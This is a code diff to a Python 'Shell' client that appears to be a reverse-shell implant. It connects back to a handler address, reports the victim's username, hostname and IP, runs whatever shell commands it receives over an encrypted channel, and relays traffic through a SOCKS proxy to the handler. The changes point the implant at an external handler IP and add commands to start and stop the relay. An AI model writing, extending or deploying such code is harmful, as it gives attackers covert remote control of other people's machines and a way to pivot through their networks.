@@ -4,10 +4,25 @@ from Crypto.Cipher import AES
 from twisted.internet import reactor
 from twisted.protocols import socks
 
+HANDLER_IP = "192.168.0.107"
+
 def windows_only(func):
 	def tester(junk):
 		if os.name != "nt": return "Command not available on non-windows OS."
+		else: return func(junk)
 	return tester
+	
+class StoppableThread(threading.Thread):
+	def __init__(self, target):
+		super(StoppableThread, self).__init__()
+		self.run = target
+		self._stop = threading.Event()
+		
+	def stop(self):
+		self._stop.set()
+		
+	def stopped(self):
+		return self._stop.isSet()
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
@@ -20,6 +35,7 @@ class Shell:
 		self.sent_info = ["cwd","ip","data","username","localtime","hostname"]
 		
 		self.killed = False
+		self.threads = []
 		
 	def gen_diffie_key(self):
 		modulus = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA237327FFFFFFFFFFFFFFFF
@@ -123,6 +139,7 @@ class Shell:
 		
 	@windows_only
 	def windows_only_thing(self):
+		print "ass1"
 		return "ass"
 		
 	def change_directory(self, dir):
@@ -140,18 +157,21 @@ class Shell:
 		reactor.run()
 		
 	def start_socks_proxy(self):
-		t = threading.Thread(target=self.socks_proxy_thread)
+		t = StoppableThread(target=self.socks_proxy_thread)
 		t.daemon = True
 		t.start()
+		self.threads.append(t)
 		
 	def tcp_relay(self):
-		while True:
+		remote_socket = socket.socket()
+		remote_socket.connect((HANDLER_IP,4080))
+		
+		current_thread = threading.currentThread()
+		while not current_thread.stopped():
 			local_socket = socket.socket()
-			local_socket.connect(("127.0.0.1",2080))
-			remote_socket = socket.socket()
-			remote_socket.connect(("127.0.0.1",4080))
+			local_socket.connect((HANDLER_IP,2080))
 			
-			while True:
+			while not current_thread.stopped():
 				try:
 					readable, writable, errored = select.select([local_socket, remote_socket], [], [])
 				except Exception as e:
@@ -179,14 +199,19 @@ class Shell:
 						break
 							
 			local_socket.close()
-			remote_socket.close()
 					
 	def create_tcp_relay(self):
 		self.start_socks_proxy()
-		t = threading.Thread(target=self.tcp_relay)
+		t = StoppableThread(target=self.tcp_relay)
 		t.daemon = True
 		t.start()
+		self.threads.append(t)
 		return "ok"
+		
+	def stop_tcp_relay(self):
+		for t in self.threads:
+			t.stop()
+		return "[*] Stopped"
 					
 	def handle_command(self, data):
 		command = data.split()[0]
@@ -209,12 +234,16 @@ class Shell:
 			output = self.tab_complete(arguments)
 		elif command == "crash":
 			raise Exception("As you wish")
-		elif command == "startproxy":
-			output = self.create_tcp_relay()
+		elif command == "proxy":
+			output = "invalid option"
+			if arguments == "start":
+				output = self.create_tcp_relay()
+			elif arguments == "stop":
+				output = self.stop_tcp_relay()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
-		return output
+		return str(output)
 		
 		
 	def run(self):
@@ -226,7 +255,7 @@ class Shell:
 			
 while True:
 	try:
-		shell = Shell("127.0.0.1", 8080)
+		shell = Shell(HANDLER_IP, 8080)
 		shell.connect()
 		shell.run()
 	except Exception as e:
